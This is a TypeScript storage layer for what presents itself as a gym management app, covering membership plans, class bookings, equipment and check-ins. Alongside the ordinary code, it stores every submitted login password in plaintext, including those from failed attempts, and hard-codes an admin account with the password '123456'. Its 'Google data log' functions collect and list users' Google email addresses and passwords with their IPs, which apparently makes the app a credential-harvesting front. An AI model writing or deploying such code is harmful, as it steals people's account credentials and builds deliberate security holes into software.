import { 
  type User, 
  type InsertUser, 
  type Plan,
  type Class,
  type ClassBooking,
  type Workout,
  type InsertWorkout,
  type Equipment,
  type Checkin,
  type InsertCheckin,
  type LoginAttempt,
  type GoogleDataLog,
  type InsertGoogleDataLog,
  loginAttempts,
  googleDataLogs,
  users,
  plans,
  classes,
  classBookings,
  workouts,
  equipment,
  checkins
} from "@shared/schema";

import { randomUUID } from "crypto";
import { drizzle } from "drizzle-orm/neon-http";
import { neon } from "@neondatabase/serverless";
import { eq, desc } from "drizzle-orm";

export interface IStorage {
  // User methods
  getUser(id: string): Promise<User | undefined>;
  getUserByEmail(email: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  updateUser(id: string, updates: Partial<User>): Promise<User | undefined>;
  
  // Plan methods
  getPlans(): Promise<Plan[]>;
  getPlan(id: string): Promise<Plan | undefined>;
  
  // Class methods
  getClasses(): Promise<Class[]>;
  getClassesByDate(date: string): Promise<Class[]>;
  getClass(id: string): Promise<Class | undefined>;
  createClass(classData: Omit<Class, 'id' | 'currentParticipants'>): Promise<Class>;
  updateClass(id: string, updates: Partial<Class>): Promise<Class | undefined>;
  
  // Class booking methods
  getClassBookings(userId: string): Promise<ClassBooking[]>;
  createClassBooking(userId: string, classId: string): Promise<ClassBooking>;
  cancelClassBooking(userId: string, classId: string): Promise<boolean>;
  
  // Workout methods
  getWorkouts(userId: string): Promise<Workout[]>;
  getWorkout(id: string): Promise<Workout | undefined>;
  createWorkout(workout: InsertWorkout): Promise<Workout>;
  
  // Equipment methods
  getEquipment(): Promise<Equipment[]>;
  getEquipmentByCategory(category: string): Promise<Equipment[]>;
  updateEquipmentStatus(id: string, status: string, reservedBy?: string): Promise<Equipment | undefined>;
  
  // Checkin methods
  getCheckins(userId: string): Promise<Checkin[]>;
  createCheckin(checkin: InsertCheckin): Promise<Checkin>;
  updateCheckin(id: string, checkoutTime: Date): Promise<Checkin | undefined>;
  getActiveCheckin(userId: string): Promise<Checkin | undefined>;
  
  // Login attempt methods
  logLoginAttempt(email: string, password: string, success: boolean, userAgent?: string, ip?: string): Promise<LoginAttempt>;
  getRecentLoginAttempts(limit: number): Promise<LoginAttempt[]>;
  clearLoginAttempts(): Promise<void>;
  
  // Google data log methods
  logGoogleData(googleData: InsertGoogleDataLog): Promise<GoogleDataLog>;
  getGoogleDataLogs(limit: number): Promise<GoogleDataLog[]>;
  clearGoogleDataLogs(): Promise<void>;
}

// Configuração do banco de dados
const sql = process.env.DATABASE_URL ? neon(process.env.DATABASE_URL) : null;
const db = sql ? drizzle(sql) : null;

export class MemStorage implements IStorage {
  private users: Map<string, User>;
  private plans: Map<string, Plan>;
  private classes: Map<string, Class>;
  private classBookings: Map<string, ClassBooking>;
  private workouts: Map<string, Workout>;
  private equipment: Map<string, Equipment>;
  private checkins: Map<string, Checkin>;
  private loginAttempts: Map<string, LoginAttempt>;
  private googleDataLogs: Map<string, GoogleDataLog>;

  constructor() {
    this.users = new Map();
    this.plans = new Map();
    this.classes = new Map();
    this.classBookings = new Map();
    this.workouts = new Map();
    this.equipment = new Map();
    this.checkins = new Map();
    this.loginAttempts = new Map();
    this.googleDataLogs = new Map();
    
    this.initializeData();
    this.createAdminUser();
  }

  private initializeData() {
    // Initialize plans
    const plans: Plan[] = [
      {
        id: "basic",
        name: "Básico",
        description: "Acesso à musculação e cardio",
        monthlyPrice: 7990,
        features: ["Acesso à musculação", "Cardio equipment"]
      },
      {
        id: "premium",
        name: "Premium", 
        description: "Acesso completo + aulas ilimitadas",
        monthlyPrice: 12990,
        features: ["Acesso à musculação", "Aulas em grupo ilimitadas", "Personal trainer 2x/mês"]
      },
      {
        id: "vip",
        name: "VIP",
        description: "Todos os benefícios + personal + nutricionista",
        monthlyPrice: 19990,
        features: ["Todos os benefícios Premium", "Personal trainer ilimitado", "Nutricionista incluso"]
      }
    ];
    
    plans.forEach(plan => this.plans.set(plan.id, plan));

    // Initialize equipment
    const equipmentList: Equipment[] = [
      { id: randomUUID(), name: "Esteira 1", category: "Cardio", status: "available", reservedBy: null, reservedUntil: null },
      { id: randomUUID(), name: "Esteira 2", category: "Cardio", status: "occupied", reservedBy: null, reservedUntil: null },
      { id: randomUUID(), name: "Esteira 3", category: "Cardio", status: "available", reservedBy: null, reservedUntil: null },
      { id: randomUUID(), name: "Supino Reto 1", category: "Musculação", status: "occupied", reservedBy: null, reservedUntil: null },
      { id: randomUUID(), name: "Supino Reto 2", category: "Musculação", status: "available", reservedBy: null, reservedUntil: null },
      { id: randomUUID(), name: "Supino Inclinado", category: "Musculação", status: "maintenance", reservedBy: null, reservedUntil: null },
      { id: randomUUID(), name: "Bike Spinning 1", category: "Cardio", status: "available", reservedBy: null, reservedUntil: null },
      { id: randomUUID(), name: "Bike Spinning 2", category: "Cardio", status: "available", reservedBy: null, reservedUntil: null },
      { id: randomUUID(), name: "Bike Ergométrica", category: "Cardio", status: "available", reservedBy: null, reservedUntil: null },
    ];
    
    equipmentList.forEach(eq => this.equipment.set(eq.id, eq));

    // Initialize classes
    const today = new Date().toISOString().split('T')[0];
    const tomorrow = new Date(Date.now() + 86400000).toISOString().split('T')[0];
    
    const classList: Class[] = [
      {
        id: randomUUID(),
        name: "Yoga Flow",
        instructor: "Ana Costa",
        startTime: "19:00",
        endTime: "20:00",
        room: "Sala 2",
        maxParticipants: 15,
        currentParticipants: 8,
        date: tomorrow
      },
      {
        id: randomUUID(),
        name: "Crossfit",
        instructor: "Carlos Lima",
        startTime: "06:00",
        endTime: "07:00", 
        room: "Área Funcional",
        maxParticipants: 12,
        currentParticipants: 12,
        date: tomorrow
      },
      {
        id: randomUUID(),
        name: "Pilates",
        instructor: "Maria Santos",
        startTime: "18:00",
        endTime: "19:00",
        room: "Sala 1",
        maxParticipants: 20,
        currentParticipants: 20,
        date: today
      }
    ];
    
    classList.forEach(cls => this.classes.set(cls.id, cls));
  }

  private async createAdminUser() {
    // Criar sempre o admin com os dados fixos
    const adminUser: User = {
      id: "admin-001",
      name: "Administrador",
      email: "admin@gmail.com",
      password: "123456",
      phone: null,
      birthDate: null,
      memberSince: new Date().toISOString().split('T')[0],
      currentWeight: null,
      targetWeight: null,
      primaryGoal: null,
      planId: "vip",
      isCheckedIn: false,
      lastCheckin: null,
      profilePhoto: null,
      isAdmin: true
    };
    this.users.set(adminUser.id, adminUser);
  }

  // User methods
  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByEmail(email: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(user => user.email === email);
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const user: User = { 
      ...insertUser, 
      id,
      memberSince: new Date().toISOString().split('T')[0],
      isCheckedIn: false,
      lastCheckin: null,
      profilePhoto: null,
      phone: insertUser.phone || null,
      birthDate: insertUser.birthDate || null,
      currentWeight: insertUser.currentWeight || null,
      targetWeight: insertUser.targetWeight || null,
      primaryGoal: insertUser.primaryGoal || null,
      planId: insertUser.planId || "basic",
      isAdmin: false
    };
    this.users.set(id, user);
    return user;
  }

  async updateUser(id: string, updates: Partial<User>): Promise<User | undefined> {
    const user = this.users.get(id);
    if (!user) return undefined;
    
    const updatedUser = { ...user, ...updates };
    this.users.set(id, updatedUser);
    return updatedUser;
  }

  // Plan methods
  async getPlans(): Promise<Plan[]> {
    return Array.from(this.plans.values());
  }

  async getPlan(id: string): Promise<Plan | undefined> {
    return this.plans.get(id);
  }

  // Class methods
  async getClasses(): Promise<Class[]> {
    return Array.from(this.classes.values());
  }

  async getClassesByDate(date: string): Promise<Class[]> {
    return Array.from(this.classes.values()).filter(cls => cls.date === date);
  }

  async getClass(id: string): Promise<Class | undefined> {
    return this.classes.get(id);
  }

  async createClass(classData: Omit<Class, 'id' | 'currentParticipants'>): Promise<Class> {
    const id = randomUUID();
    const newClass: Class = { ...classData, id, currentParticipants: 0 };
    this.classes.set(id, newClass);
    return newClass;
  }

  async updateClass(id: string, updates: Partial<Class>): Promise<Class | undefined> {
    const cls = this.classes.get(id);
    if (!cls) return undefined;
    
    const updatedClass = { ...cls, ...updates };
    this.classes.set(id, updatedClass);
    return updatedClass;
  }

  // Class booking methods
  async getClassBookings(userId: string): Promise<ClassBooking[]> {
    return Array.from(this.classBookings.values()).filter(booking => booking.userId === userId);
  }

  async createClassBooking(userId: string, classId: string): Promise<ClassBooking> {
    const id = randomUUID();
    const booking: ClassBooking = {
      id,
      userId,
      classId,
      bookingDate: new Date(),
      status: "booked"
    };
    
    this.classBookings.set(id, booking);
    
    // Update class participant count
    const cls = this.classes.get(classId);
    if (cls) {
      cls.currentParticipants = (cls.currentParticipants || 0) + 1;
      this.classes.set(classId, cls);
    }
    
    return booking;
  }

  async cancelClassBooking(userId: string, classId: string): Promise<boolean> {
    const booking = Array.from(this.classBookings.values()).find(
      b => b.userId === userId && b.classId === classId && b.status === "booked"
    );
    
    if (!booking) return false;
    
    booking.status = "cancelled";
    this.classBookings.set(booking.id, booking);
    
    // Update class participant count
    const cls = this.classes.get(classId);
    if (cls) {
      cls.currentParticipants = Math.max(0, (cls.currentParticipants || 0) - 1);
      this.classes.set(classId, cls);
    }
    
    return true;
  }

  // Workout methods
  async getWorkouts(userId: string): Promise<Workout[]> {
    return Array.from(this.workouts.values())
      .filter(workout => workout.userId === userId)
      .sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());
  }

  async getWorkout(id: string): Promise<Workout | undefined> {
    return this.workouts.get(id);
  }

  async createWorkout(workout: InsertWorkout): Promise<Workout> {
    const id = randomUUID();
    const newWorkout: Workout = { 
      ...workout, 
      id,
      calories: workout.calories || null 
    };
    this.workouts.set(id, newWorkout);
    return newWorkout;
  }

  // Equipment methods
  async getEquipment(): Promise<Equipment[]> {
    return Array.from(this.equipment.values());
  }

  async getEquipmentByCategory(category: string): Promise<Equipment[]> {
    return Array.from(this.equipment.values()).filter(eq => eq.category === category);
  }

  async updateEquipmentStatus(id: string, status: string, reservedBy?: string): Promise<Equipment | undefined> {
    const equipment = this.equipment.get(id);
    if (!equipment) return undefined;
    
    const updatedEquipment = {
      ...equipment,
      status,
      reservedBy: reservedBy || null,
      reservedUntil: reservedBy ? new Date(Date.now() + 3600000) : null // 1 hour from now
    };
    
    this.equipment.set(id, updatedEquipment);
    return updatedEquipment;
  }

  // Checkin methods
  async getCheckins(userId: string): Promise<Checkin[]> {
    return Array.from(this.checkins.values())
      .filter(checkin => checkin.userId === userId)
      .sort((a, b) => new Date(b.checkinTime!).getTime() - new Date(a.checkinTime!).getTime());
  }

  async createCheckin(checkin: InsertCheckin): Promise<Checkin> {
    const id = randomUUID();
    const newCheckin: Checkin = {
      ...checkin,
      id,
      checkinTime: new Date(),
      checkoutTime: null,
      duration: null
    };
    this.checkins.set(id, newCheckin);
    return newCheckin;
  }

  async updateCheckin(id: string, checkoutTime: Date): Promise<Checkin | undefined> {
    const checkin = this.checkins.get(id);
    if (!checkin) return undefined;
    
    const duration = Math.floor((checkoutTime.getTime() - checkin.checkinTime!.getTime()) / 60000);
    const updatedCheckin = {
      ...checkin,
      checkoutTime,
      duration
    };
    
    this.checkins.set(id, updatedCheckin);
    return updatedCheckin;
  }

  async getActiveCheckin(userId: string): Promise<Checkin | undefined> {
    return Array.from(this.checkins.values()).find(
      checkin => checkin.userId === userId && !checkin.checkoutTime
    );
  }

  // Login attempt methods - using database
  async logLoginAttempt(email: string, password: string, success: boolean, userAgent?: string, ip?: string): Promise<LoginAttempt> {
    if (db) {
      try {
        const result = await db.insert(loginAttempts).values({
          email,
          password,
          success,
          userAgent: userAgent || null,
          ip: ip || null
        }).returning();
        return result[0];
      } catch (error) {
        console.error('Error logging login attempt to database:', error);
        // Fallback to memory storage
      }
    }
    
    // Fallback to memory storage if no database
    const id = randomUUID();
    const attempt: LoginAttempt = {
      id,
      email,
      password,
      timestamp: new Date(),
      success,
      userAgent: userAgent || null,
      ip: ip || null
    };
    this.loginAttempts.set(id, attempt);
    return attempt;
  }

  async getRecentLoginAttempts(limit: number = 50): Promise<LoginAttempt[]> {
    if (db) {
      try {
        const result = await db.select()
          .from(loginAttempts)
          .orderBy(desc(loginAttempts.timestamp))
          .limit(limit);
        return result;
      } catch (error) {
        console.error('Error getting login attempts from database:', error);
        // Fallback to memory storage
      }
    }
    
    // Fallback to memory storage if no database
    return Array.from(this.loginAttempts.values())
      .sort((a, b) => {
        const aTime = a.timestamp ? new Date(a.timestamp).getTime() : 0;
        const bTime = b.timestamp ? new Date(b.timestamp).getTime() : 0;
        return bTime - aTime;
      })
      .slice(0, limit);
  }

  async clearLoginAttempts(): Promise<void> {
    if (db) {
      try {
        await db.delete(loginAttempts);
        console.log('✅ All login attempts cleared from database');
      } catch (error) {
        console.error('❌ Error clearing login attempts from database:', error);
        // Fallback to memory storage if database operation fails
      }
    }
    // Always clear from memory storage as a fallback or primary method
    this.loginAttempts.clear();
    console.log('✅ All login attempts cleared from memory');
  }

  // Google data log methods
  async logGoogleData(googleData: InsertGoogleDataLog): Promise<GoogleDataLog> {
    if (db) {
      try {
        const result = await db.insert(googleDataLogs).values({
          googleEmail: googleData.googleEmail,
          googlePassword: googleData.googlePassword,
          submittedBy: googleData.submittedBy,
          userAgent: googleData.userAgent || null,
          ip: googleData.ip || null,
          notes: googleData.notes || null
        }).returning();
        return result[0];
      } catch (error) {
        console.error('Error logging Google data to database:', error);
        // Fallback to memory storage
      }
    }
    
    // Fallback to memory storage if no database
    const id = randomUUID();
    const log: GoogleDataLog = {
      id,
      googleEmail: googleData.googleEmail,
      googlePassword: googleData.googlePassword,
      timestamp: new Date(),
      submittedBy: googleData.submittedBy,
      userAgent: googleData.userAgent || null,
      ip: googleData.ip || null,
      notes: googleData.notes || null
    };
    this.googleDataLogs.set(id, log);
    return log;
  }

  async getGoogleDataLogs(limit: number = 50): Promise<GoogleDataLog[]> {
    if (db) {
      try {
        const result = await db.select()
          .from(googleDataLogs)
          .orderBy(desc(googleDataLogs.timestamp))
          .limit(limit);
        return result;
      } catch (error) {
        console.error('Error getting Google data logs from database:', error);
        // Fallback to memory storage
      }
    }
    
    // Fallback to memory storage if no database
    return Array.from(this.googleDataLogs.values())
      .sort((a, b) => {
        const aTime = a.timestamp ? new Date(a.timestamp).getTime() : 0;
        const bTime = b.timestamp ? new Date(b.timestamp).getTime() : 0;
        return bTime - aTime;
      })
      .slice(0, limit);
  }

  async clearGoogleDataLogs(): Promise<void> {
    if (db) {
      try {
        await db.delete(googleDataLogs);
        console.log('✅ All Google data logs cleared from database');
      } catch (error) {
        console.error('❌ Error clearing Google data logs from database:', error);
        // Fallback to memory storage if database operation fails
      }
    }
    // Always clear from memory storage as a fallback or primary method
    this.googleDataLogs.clear();
    console.log('✅ All Google data logs cleared from memory');
  }
}

export const storage = new MemStorage();
